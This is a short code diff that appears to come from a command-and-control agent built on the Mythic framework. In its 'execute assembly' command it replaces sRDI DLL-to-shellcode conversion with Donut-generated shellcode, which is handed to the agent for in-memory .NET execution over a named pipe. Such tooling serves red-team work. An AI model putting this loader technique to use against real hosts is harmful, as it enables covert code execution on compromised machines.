@@ -5,6 +5,7 @@ from sRDI import ShellcodeRDI
 from mythic_payloadtype_container.MythicRPC import *
 from os import path
 import base64
+import donut
 
 class ExecuteAssemblyArguments(TaskArguments):
 
@@ -41,12 +42,11 @@ class ExecuteAssemblyCommand(CommandBase):
 
     async def create_tasking(self, task: MythicTask) -> MythicTask:
         task.args.add_arg("pipe_name", str(uuid4()))
-        dllPath = path.join(self.agent_code_path, "AssemblyLoader_{}.dll".format(task.callback.architecture))
-        dllBytes = open(dllPath, 'rb').read()
-        converted_dll = ShellcodeRDI.ConvertToShellcode(dllBytes, ShellcodeRDI.HashFunctionName("InitializeNamedPipeServer"), task.args.get_arg("pipe_name").encode(), 0)
+        exePath = path.join(self.agent_code_path, "ExecuteAssembly/bin/Release/ExecuteAssembly.exe")
+        donutPic = donut.create(file=exePath, params=task.args.get_arg("pipe_name"))
         file_resp = await MythicRPC().execute("create_file",
                                               task_id=task.id,
-                                              file=base64.b64encode(converted_dll).decode(),
+                                              file=base64.b64encode(donutPic).decode(),
                                               delete_after_fetch=True)
         if file_resp.status == MythicStatus.Success:
             task.args.add_arg("loader_stub_id", file_resp.response['agent_file_id'])
